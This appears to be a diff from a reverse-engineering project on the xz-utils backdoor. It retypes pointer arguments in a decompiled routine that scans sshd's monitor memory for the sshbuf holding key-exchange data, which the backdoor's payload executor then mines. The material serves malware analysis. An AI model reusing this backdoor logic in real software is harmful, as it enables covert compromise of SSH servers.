@@ -7,8 +7,8 @@
 /*
  * AutoDoc: Walks the cached monitor structure to locate the sshbuf that carries key-exchange data, falling back to heuristics if necessary. The payload executor calls it before mining modulus bytes from the session state.
  */
-#include "xzre_types.h"
 
+#include "xzre_types.h"
 
 BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
 
@@ -52,14 +52,15 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
         }
       }
       BVar5 = is_range_mapped((u8 *)addr_00,8,ctx);
-      if ((BVar5 != FALSE) && (BVar5 = is_range_mapped((u8 *)*addr_00,0x400,ctx), BVar5 != FALSE)) {
+      if ((BVar5 != FALSE) &&
+         (BVar5 = is_range_mapped(&(*addr_00)->opaque,0x400,ctx), BVar5 != FALSE)) {
         cVar2 = *(char *)&(ctx->sshd_offsets).field0_0x0;
         addr_01 = *addr_00;
         if (cVar2 < '\0') {
           uVar9 = 0;
           pkVar1 = addr_01 + 0x400;
           for (; addr_01 < pkVar1; addr_01 = addr_01 + 8) {
-            BVar5 = is_range_mapped((u8 *)addr_01,length,ctx);
+            BVar5 = is_range_mapped(&addr_01->opaque,length,ctx);
             if ((BVar5 != FALSE) &&
                (BVar5 = sshbuf_extract(*(sshbuf **)addr_01,ctx,&sshbuf->d,&sshbuf->size),
                BVar5 != FALSE)) {
